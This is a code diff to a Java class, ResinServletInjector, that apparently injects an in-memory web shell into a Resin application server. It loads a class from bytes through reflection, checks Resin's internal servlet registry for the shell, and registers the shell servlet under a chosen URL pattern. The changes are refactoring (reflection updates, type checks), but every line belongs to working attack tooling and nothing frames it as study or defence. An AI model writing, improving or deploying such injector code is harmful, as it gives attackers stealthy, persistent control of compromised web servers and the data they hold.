@@ -88,18 +88,22 @@ public class ResinServletInjector {
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
-        return clazz.newInstance();
+        return clazz.getDeclaredConstructor().newInstance();
     }
 
     private void inject(Object context, Object servlet) throws Exception {
-        Map<String, Object> servlets = (Map) getFieldValue(getFieldValue(context, "_servletManager"), "_servlets");
-        for (String key : servlets.keySet()) {
-            if (key.contains(shellClassName)) {
+        Object servletMapValue = getFieldValue(getFieldValue(context, "_servletManager"), "_servlets");
+        if (!(servletMapValue instanceof Map<?, ?>)) {
+            throw new IllegalStateException("Resin servlet registry not found");
+        }
+        Map<?, ?> servlets = (Map<?, ?>) servletMapValue;
+        for (Object key : servlets.keySet()) {
+            if (key != null && String.valueOf(key).contains(shellClassName)) {
                 return;
             }
         }
         Class<?> servletMappingClass = context.getClass().getClassLoader().loadClass("com.caucho.server.dispatch.ServletMapping");
-        Object servletMapping = servletMappingClass.newInstance();
+        Object servletMapping = servletMappingClass.getDeclaredConstructor().newInstance();
         invokeMethod(servletMapping, "setServletName", new Class[]{String.class}, new Object[]{shellClassName});
         invokeMethod(servletMapping, "setServletClass", new Class[]{String.class}, new Object[]{shellClassName});
         invokeMethod(servletMapping, "addURLPattern", new Class[]{String.class}, new Object[]{urlPattern});
